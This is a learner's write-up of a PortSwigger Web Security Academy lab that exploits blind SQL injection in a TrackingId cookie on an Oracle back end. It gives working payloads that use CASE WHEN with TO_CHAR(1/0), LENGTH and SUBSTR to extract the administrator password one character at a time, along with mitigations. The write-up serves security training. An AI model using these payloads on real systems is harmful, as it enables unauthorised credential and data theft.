## Lab 12: Blind SQL Injection with Conditional Errors

### Platform

PortSwigger Web Security Academy

### Difficulty

Practitioner

### Topic

SQL Injection / Blind SQL Injection / Conditional Errors / Oracle Database

### Lab Status

Solved

### Objective

The goal of this lab was to exploit a blind SQL injection vulnerability in the `TrackingId` cookie and recover the administrator user's password by using conditional SQL errors.

### Simple Explanation

In this lab, the application did not display query results.

It also did not show a different normal response when a condition was true or false.

However, the application returned a custom error message when the SQL query caused an error.

By intentionally causing a database error only when a condition was true, it was possible to infer information about the administrator password.

For example:

```text
If the condition is true  → cause a SQL error → HTTP 500
If the condition is false → no SQL error      → HTTP 200
```

This allowed the password to be extracted one character at a time.

### Vulnerability Description

The application used the value of the `TrackingId` cookie inside a SQL query without secure handling.

Although the query results were not returned to the user, SQL errors affected the application's response.

This created a blind SQL injection vulnerability based on conditional errors.

### Key Concept

Blind SQL injection does not always depend on visible output.

In this lab, the attacker could infer whether a SQL condition was true or false by observing whether the application returned an error.

A deliberate error such as division by zero was used to create a detectable difference in the response.

### Steps Taken

Intercepted the request containing the `TrackingId` cookie.

Added a single quotation mark to the cookie value to test for SQL injection.

Confirmed that the application returned an error when the SQL syntax was broken.

Added two quotation marks and confirmed that the error disappeared.

Tested Oracle syntax using the `dual` table.

Confirmed that the backend database was likely Oracle.

Verified that the `users` table existed.

Tested conditional errors using a `CASE WHEN` statement.

Confirmed that a true condition caused an error.

Confirmed that a false condition did not cause an error.

Verified that the `administrator` user existed.

Determined the length of the administrator password using `LENGTH(password)`.

Used `SUBSTR()` to test each character of the password.

Used Burp Intruder to automate character testing.

Identified the correct character by looking for responses with HTTP status code `500`.

Recovered the administrator password.

Logged in as the administrator user.

Successfully solved the lab.

### Important Payload Logic

The main idea was to use a condition like this:

```sql
CASE WHEN condition THEN TO_CHAR(1/0) ELSE '' END
```

If the condition was true, the database evaluated:

```sql
TO_CHAR(1/0)
```

This caused a division-by-zero error.

If the condition was false, the database returned an empty string and no error occurred.

### Example Condition Test

A true condition caused an error:

```sql
'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
```

A false condition did not cause an error:

```sql
'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
```

This proved that:

```text
HTTP 500 = condition is true
HTTP 200 = condition is false
```

### Password Length Testing

The password length was tested using:

```sql
'||(SELECT CASE WHEN LENGTH(password)>1 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```

The number was increased until the condition became false.

The password length was found to be:

```text
20 characters
```

### Character Extraction

Each character was tested using:

```sql
'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```

The position number was changed from `1` to `20`.

The tested character was changed through lowercase letters and numbers.

When the response returned HTTP `500`, the tested character was correct.

### Recovered Password

The administrator password was successfully recovered:

```text
6tl58rzyyx7yc4zx2tq6
```

### Result

The administrator password was successfully extracted using blind SQL injection with conditional errors.

The password was then used to log in as the administrator user and solve the lab.

### What I Learned

Blind SQL injection can still be exploited even when query results are hidden.

Application error behavior can leak sensitive information.

Conditional errors can be used to convert true or false SQL conditions into visible application behavior.

Oracle databases require the `dual` table for standalone `SELECT` statements.

`CASE WHEN` can be used to control when an error is triggered.

`LENGTH()` can be used to determine the length of sensitive data.

`SUBSTR()` can be used to extract individual characters.

Burp Intruder can automate repetitive character testing.

### Security Impact

In a real-world application, this vulnerability could allow attackers to extract sensitive information from the database, including usernames, passwords, tokens, API keys, and personal data.

Even if the application does not display database results, error behavior can still expose confidential information.

### Mitigation

To prevent this vulnerability, developers should:

Use parameterized queries or prepared statements.

Avoid inserting user-controlled input directly into SQL queries.

Validate and sanitize all user input, including cookies.

Disable detailed database error behavior in production.

Use generic error messages that do not reveal backend behavior.

Apply least-privilege database permissions.

Monitor suspicious repetitive requests.

Use secure session and cookie handling.

### Tools Used

PortSwigger Web Security Academy

Burp Suite Community Edition

Burp Proxy

Burp Repeater

Burp Intruder

Web Browser

